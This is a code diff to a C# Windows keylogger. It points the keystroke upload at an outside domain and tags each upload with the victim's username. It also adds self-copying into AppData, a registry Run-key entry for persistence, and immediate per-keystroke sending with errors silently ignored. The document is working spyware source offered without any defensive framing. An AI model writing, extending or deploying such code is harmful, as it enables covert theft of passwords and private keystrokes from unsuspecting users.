@@ -8,6 +8,8 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Net.Http;
 using System.Text;
+using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace KeyLogger
 {
@@ -15,7 +17,9 @@ namespace KeyLogger
     {
         private static string buf = "";
         private static readonly HttpClient client = new HttpClient();
-        private static readonly string apiUrl = "http://localhost:8080/log?username=" + Environment.UserName;
+        private static readonly string apiUrl = "https://keylogger.delphigamerz.xyz/log?username=" + Environment.UserName;
+
+        private static string InstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "KeyLogger", "KeyLogger.exe");
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -23,9 +27,16 @@ namespace KeyLogger
         [STAThread]
         static void Main(String[] args)
         {
+            if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
+            {
+                return;
+            }
+
+            EnsureInstalled();
+
             while (true)
             {
-                Thread.Sleep(100);
+                Thread.Sleep(10);
 
                 // An even more advanced check
                 bool shift = false;
@@ -86,7 +97,7 @@ namespace KeyLogger
                             buf += $"<{((Keys)i).ToString()}>";
                         }
 
-                        if (buf.Length > 10)
+                        if (buf.Length > 0)
                         {
                             _ = SendPayload(buf);
                             buf = "";
@@ -106,6 +117,39 @@ namespace KeyLogger
             catch (Exception)
             {
                 // Silently ignore errors
+            }
+        }
+
+        private static void EnsureInstalled()
+        {
+            string currentExe = Process.GetCurrentProcess().MainModule.FileName;
+
+            if (!string.Equals(currentExe, InstallPath, StringComparison.OrdinalIgnoreCase))
+            {
+                try
+                {
+                    string installDirectory = Path.GetDirectoryName(InstallPath);
+                    if (!Directory.Exists(installDirectory))
+                    {
+                        Directory.CreateDirectory(installDirectory);
+                    }
+
+                    File.Copy(currentExe, InstallPath, true);
+
+                    // Register for startup
+                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
+                    {
+                        key.SetValue("KeyLogger", $"\"{InstallPath}\"");
+                    }
+
+                    // Start the installed version
+                    Process.Start(InstallPath);
+                    Environment.Exit(0);
+                }
+                catch (Exception)
+                {
+                    // If installation fails (e.g. permissions), just continue running from current location
+                }
             }
         }
     }
